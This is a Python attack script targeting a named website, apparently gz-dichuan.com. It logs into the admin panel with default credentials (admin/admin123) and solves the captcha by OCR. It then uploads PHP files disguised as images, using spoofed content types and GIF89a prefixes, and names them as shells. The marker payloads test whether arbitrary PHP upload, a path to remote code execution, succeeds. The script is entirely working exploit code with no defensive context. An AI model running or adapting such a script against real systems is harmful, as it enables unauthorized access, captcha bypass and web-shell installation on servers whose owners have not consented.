#!/usr/bin/env python3
"""gz-dichuan: login then upload via /index.php/home/user/uploadfile with session"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, uuid

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = "import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); print(o.classification(base64.b64decode('%s')))" % b64
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

def do_login(op, fetch):
    for attempt in range(10):
        try:
            code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
            code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                     headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
            cap_text = ocr(cap)
            data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
            code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                      headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                               "X-Requested-With": "XMLHttpRequest"})
            rt = resp.decode("utf-8", "ignore")
            if "登录成功" in rt or '"status":1' in rt:
                print("login ok (attempt %d, OCR=%s)" % (attempt, cap_text))
                return True
        except Exception as e:
            print("login attempt %d err: %s" % (attempt, e))
    return False

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

if not do_login(op, fetch):
    print("LOGIN FAILED")
    sys.exit(1)

# now upload via uploadfile with session
def upload(fname, content, ctype):
    boundary = "----FormBoundary" + uuid.uuid4().hex
    body = b""
    body += ("--%s\r\n" % boundary).encode()
    body += ("Content-Disposition: form-data; name=\"Filedata\"; filename=\"%s\"\r\n" % fname).encode()
    body += ("Content-Type: %s\r\n\r\n" % ctype).encode()
    body += content
    body += ("\r\n--%s--\r\n" % boundary).encode()
    req = urllib.request.Request(HOST + "/index.php/home/user/uploadfile", data=body, headers={
        **UA, "Content-Type": "multipart/form-data; boundary=" + boundary,
        "Referer": HOST + "/index.php?m=admin&c=goods&a=adddrugs",
        "X-Requested-With": "XMLHttpRequest"})
    try:
        r = op.open(req, timeout=15)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

code, resp = upload("gz_hm.gif", b'GIF89a<?php echo "GZ_SESS_TEST_123"; ?>', "image/gif")
print("upload gif:", code, resp[:300])

code, resp = upload("gz_shell.php", b'<?php echo "GZ_SESS_PHP_456"; ?>', "image/jpeg")
print("upload php:", code, resp[:300])

code, resp = upload("gz_shell.jpg", b'GIF89a<?php echo "GZ_SESS_JPG_789"; ?>', "image/jpeg")
print("upload jpg:", code, resp[:300])
